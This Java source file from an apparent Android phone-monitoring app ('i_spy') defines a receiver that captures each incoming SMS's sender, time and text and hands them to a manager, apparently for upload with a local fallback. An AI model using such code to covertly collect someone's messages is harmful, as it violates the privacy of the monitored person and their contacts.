package com.um.asn.i_spy.listeners;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;

import com.um.asn.i_spy.manager.MessageManager;
import com.um.asn.i_spy.models.Message;
import com.um.asn.i_spy.models.Phone;

import java.util.ArrayList;

public class MessageReceiveListener extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");

                ArrayList<Message> messages = new ArrayList<Message>();
                Phone phone = new Phone();
                phone.loadWithFile(context);

                for (int i = 0; i < pdus.length; i++) {
                    System.out.println("Message recu");
                    SmsMessage msg;
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        msg = SmsMessage.createFromPdu((byte[]) pdus[i], bundle.getString("format"));
                    } else {
                        msg = SmsMessage.createFromPdu((byte[]) pdus[i]);
                    }

                    Message message = new Message(
                            msg.getDisplayOriginatingAddress(),
                            Message.TYPE_RECEIVED,
                            (int) (msg.getTimestampMillis() / 1000),
                            msg.getDisplayMessageBody(),
                            phone
                    );
                    messages.add(message);
                    System.out.println(message.getNumero() + " / " + message.getType() + " / " + message.getDate() + " / " + message.getContenu());
                }

                MessageManager messageManager = new MessageManager(context, phone);
                messageManager.setMessages(messages);
                if (!messageManager.insert())
                    messageManager.insertLocal();
            }
        }
    }
}
